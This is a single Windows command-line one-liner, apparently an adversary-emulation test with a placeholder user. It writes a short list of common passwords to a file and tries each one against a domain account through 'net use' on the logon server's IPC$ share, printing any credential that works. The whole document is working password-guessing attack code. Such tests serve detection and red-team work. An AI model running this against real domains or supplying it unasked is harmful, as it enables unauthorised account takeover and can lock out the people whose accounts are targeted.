echo Password1> passwords.txt && echo 1q2w3e4r>> passwords.txt && echo Password!>> passwords.txt && echo Spring2022>> passwords.txt && echo ChangeMe!>> passwords.txt && @FOR /F "delims=" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:"%userdomain%\#{user}" "%p" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL